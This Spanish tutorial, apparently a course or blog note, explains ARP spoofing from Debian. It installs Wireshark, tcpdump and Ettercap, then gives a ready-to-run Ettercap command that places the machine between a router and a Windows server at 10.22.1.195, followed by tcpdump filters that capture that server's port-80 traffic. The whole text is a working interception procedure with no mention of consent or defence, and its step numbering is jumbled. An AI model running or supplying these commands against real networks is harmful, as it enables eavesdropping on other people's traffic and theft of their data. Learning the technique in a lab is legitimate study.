Spoofing desde Debian Core

Para realizar un spoofing desde Debian Core, sigue los siguientes pasos:

  1. Instalar la interfaz gráfica de Wireshark: Ejecuta el siguiente comando para instalar la interfaz gráfica de Wireshark:
    2. apt install wireshark
  2. Instalar tcpdump: Ejecuta el siguiente comando para instalar tcpdump:
    3. apt install tcpdump
  3. Instalar Ettercap en modo solo texto: Ejecuta el siguiente comando para instalar Ettercap en modo solo texto:
    4. apt install ettercap-text-only
  4. Una vez instalado, podemos escuchar el tráfico de red utilizando Ettercap y tcpdump:
    • Ettercap:
      • ettercap -T -S -i wlan -M arp:remote /10.22.1.10// /10.22.1.195// Este comando utiliza Ettercap para realizar un ataque de spoofing ARP en la red, redirigiendo el tráfico entre el router y el servidor Windows 10.22.1.195.
    • Tcpdump:
      • tcpdump -i enp0s3 host 10.22.1.195 Este comando utiliza tcpdump para capturar el tráfico de red de la interfaz enp0s3 y filtrarlo por la dirección IP del servidor Windows 10.22.1.195.
  5. Observar las conexiones utilizando tcpdump:
    6. tcpdump -i enp0s3 -s0 -Aql src 10.22.1.195 and port 80 Este comando utiliza tcpdump para capturar y mostrar el tráfico de red en tiempo real de la interfaz enp0s3, filtrando por la dirección IP de origen 10.22.1.195 y el puerto 80.
  6. Observar las conexiones utilizando Wireshark:
    7. wireshark Abre Wireshark con privilegios de usuario root para capturar y analizar el tráfico de red en la interfaz seleccionada.
